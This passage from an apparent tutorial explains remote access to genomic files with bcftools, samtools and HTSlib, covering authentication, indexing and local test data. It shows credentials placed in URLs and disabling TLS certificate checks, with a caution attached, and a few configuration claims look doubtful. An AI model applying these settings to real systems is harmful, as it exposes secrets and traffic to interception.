<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="bearer-token-authentication">Bearer Token Authentication<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#bearer-token-authentication" class="hash-link" aria-label="Direct link to Bearer Token Authentication" title="Direct link to Bearer Token Authentication" translate="no">​</a></h4>
<p>For endpoints that accept Bearer tokens (common in cloud platforms):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Option 1: Set environment variable</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">HTTPS_AUTH_BEARER</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"your_bearer_token"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view https://api.example.com/data/variants.vcf.gz chr1:1-1000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Option 2: Pass in URL (less secure)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view https://token:your_bearer_token@api.example.com/data/variants.vcf.gz chr1:1-1000000</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="api-keys-in-headers">API Keys in Headers<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#api-keys-in-headers" class="hash-link" aria-label="Direct link to API Keys in Headers" title="Direct link to API Keys in Headers" translate="no">​</a></h4>
<p>For services requiring custom headers, use <code>curl</code> with a named pipe:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create a wrapper using curl and process substitution</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-H</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Authorization: Bearer TOKEN"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     https://api.example.com/data/variants.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--output</span><span class="token plain"> - </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  chr1:1-1000000</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="basic-http-authentication">Basic HTTP Authentication<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#basic-http-authentication" class="hash-link" aria-label="Direct link to Basic HTTP Authentication" title="Direct link to Basic HTTP Authentication" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># URL-embedded credentials (not recommended for security)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view https://username:password@secure.example.com/data/variants.vcf.gz chr1:1-1000000</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="42-practical-https-workflows">4.2 Practical HTTPS Workflows<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#42-practical-https-workflows" class="hash-link" aria-label="Direct link to 4.2 Practical HTTPS Workflows" title="Direct link to 4.2 Practical HTTPS Workflows" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="query-public-https-hosted-data">Query Public HTTPS-hosted Data<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#query-public-https-hosted-data" class="hash-link" aria-label="Direct link to Query Public HTTPS-hosted Data" title="Direct link to Query Public HTTPS-hosted Data" translate="no">​</a></h4>
<p>Many databases provide HTTPS access to genomic data:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Example: Query genome annotation from HTTPS endpoint</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view https://example.genomics.org/public/variants.vcf.gz chr1:1-1000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract specific information</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view https://example.genomics.org/public/variants.vcf.gz chr1:1-1000000 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> bcftools query </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'%CHROM\t%POS\t%REF\t%ALT\t%AC\n'</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="download-indexed-files-locally">Download Indexed Files Locally<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#download-indexed-files-locally" class="hash-link" aria-label="Direct link to Download Indexed Files Locally" title="Direct link to Download Indexed Files Locally" translate="no">​</a></h4>
<p>For repeated queries, consider caching indexes locally:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Download index file (small, fast)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> variants.vcf.gz.tbi https://api.example.com/data/variants.vcf.gz.tbi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Query still uses remote file but with local index knowledge</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view https://api.example.com/data/variants.vcf.gz chr1:1-1000000</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="43-ssltls-certificate-issues">4.3 SSL/TLS Certificate Issues<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#43-ssltls-certificate-issues" class="hash-link" aria-label="Direct link to 4.3 SSL/TLS Certificate Issues" title="Direct link to 4.3 SSL/TLS Certificate Issues" translate="no">​</a></h3>
<p>If you encounter certificate validation errors:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Disable certificate verification (use cautiously)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">SSL_NO_VERIFY</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view https://api.example.com/data/variants.vcf.gz chr1:1-1000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or use curl environment variable</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">CURL_CA_BUNDLE</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view https://api.example.com/data/variants.vcf.gz chr1:1-1000000</span><br></span></code></pre></div></div>
<p><strong>Security Note</strong>: Only disable certificate verification for trusted internal endpoints or testing.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-indexing-and-efficient-region-queries">5. Indexing and Efficient Region Queries<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#5-indexing-and-efficient-region-queries" class="hash-link" aria-label="Direct link to 5. Indexing and Efficient Region Queries" title="Direct link to 5. Indexing and Efficient Region Queries" translate="no">​</a></h2>
<p>Efficient remote file access depends on proper indexing. HTSlib tools use byte-range requests to fetch only necessary data.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="51-creating-indexes">5.1 Creating Indexes<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#51-creating-indexes" class="hash-link" aria-label="Direct link to 5.1 Creating Indexes" title="Direct link to 5.1 Creating Indexes" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="create-tabix-index-for-vcf-files">Create Tabix Index for VCF Files<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#create-tabix-index-for-vcf-files" class="hash-link" aria-label="Direct link to Create Tabix Index for VCF Files" title="Direct link to Create Tabix Index for VCF Files" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># For bgzip-compressed VCF files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tabix </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> vcf variants.vcf.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify index</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-lh</span><span class="token plain"> variants.vcf.gz*</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="create-csi-index-for-bcf-files">Create CSI Index for BCF Files<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#create-csi-index-for-bcf-files" class="hash-link" aria-label="Direct link to Create CSI Index for BCF Files" title="Direct link to Create CSI Index for BCF Files" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># CSI indexes support larger files and datasets</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools index </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> variants.bcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify index</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-lh</span><span class="token plain"> variants.bcf.csi</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="create-bai-index-for-bam-files">Create BAI Index for BAM Files<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#create-bai-index-for-bam-files" class="hash-link" aria-label="Direct link to Create BAI Index for BAM Files" title="Direct link to Create BAI Index for BAM Files" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Standard BAM indexing</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools index aligned.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Creates aligned.bam.bai</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-lh</span><span class="token plain"> aligned.bam.bai</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="52-verifying-index-integrity">5.2 Verifying Index Integrity<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#52-verifying-index-integrity" class="hash-link" aria-label="Direct link to 5.2 Verifying Index Integrity" title="Direct link to 5.2 Verifying Index Integrity" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check if VCF index is valid</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tabix </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token plain"> variants.vcf.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-10</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Query a specific region (tests index)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view variants.vcf.gz chr1:1-1000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-H</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="53-performance-indexed-vs-unindexed-remote-access">5.3 Performance: Indexed vs Unindexed Remote Access<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#53-performance-indexed-vs-unindexed-remote-access" class="hash-link" aria-label="Direct link to 5.3 Performance: Indexed vs Unindexed Remote Access" title="Direct link to 5.3 Performance: Indexed vs Unindexed Remote Access" translate="no">​</a></h3>
<p><strong>Indexed remote access</strong> (with region query):</p>
<ul>
<li class="">Seeks to file index</li>
<li class="">Downloads byte-range containing target region</li>
<li class="">Returns ~100KB-1MB of data</li>
</ul>
<p><strong>Unindexed remote access</strong>:</p>
<ul>
<li class="">Must scan entire file sequentially</li>
<li class="">Downloads entire file</li>
<li class="">Returns all data (can be GB-sized)</li>
</ul>
<p>Example performance comparison:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Indexed query (fast, ~1-5 seconds)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain"> bcftools view s3://my-bucket/variants.vcf.gz chr1:1-1000000 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /dev/null</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Without index (very slow, minutes or fails)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># HTSlib automatically uses index if available, so explicitly avoid it only if needed</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="54-testing-remote-file-access-with-local-files">5.4 Testing Remote File Access with Local Files<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#54-testing-remote-file-access-with-local-files" class="hash-link" aria-label="Direct link to 5.4 Testing Remote File Access with Local Files" title="Direct link to 5.4 Testing Remote File Access with Local Files" translate="no">​</a></h3>
<p>Before working with remote files, it's helpful to test bcftools and samtools locally. Use this workflow to verify your installation and practice region queries.</p>
<p><strong>Create test VCF file:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create test directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> ~/genomics-test </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> ~/genomics-test</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create test VCF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> test.vcf </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'EOF'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">##fileformat=VCFv4.2</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">##INFO=&lt;ID=DP,Number=1,Type=Integer,Description="Total read depth"&gt;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">##FORMAT=&lt;ID=GT,Number=1,Type=String,Description="Genotype"&gt;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">#CHROM	POS	ID	REF	ALT	QUAL	FILTER	INFO	FORMAT	sample1	sample2</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">chr1	10000	.	A	G	60	.	DP=100	GT	0/1	1/1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">chr1	20000	.	C	T	50	.	DP=80	GT	0/0	0/1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">chr1	30000	.	G	A	70	.	DP=120	GT	1/1	0/1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">chr1	100000	.	T	C	55	.	DP=90	GT	0/1	0/0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compress and index (requires bgzip and tabix from pixi)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bgzip </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> test.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run tabix </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> vcf test.vcf.gz</span><br></span></code></pre></div></div>
<p><strong>Test bcftools region queries:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Query specific region</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bcftools view test.vcf.gz chr1:1-50000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract specific samples</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bcftools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> sample1 test.vcf.gz chr1:10000-50000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Count variants in region</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bcftools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-H</span><span class="token plain"> test.vcf.gz chr1:1-100000 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><br></span></code></pre></div></div>
<p><strong>Create and test BAM file:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create test SAM file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> test.sam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'EOF'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">@HD	VN:1.0	SO:coordinate</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">@SQ	SN:chr1	LN:1000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" 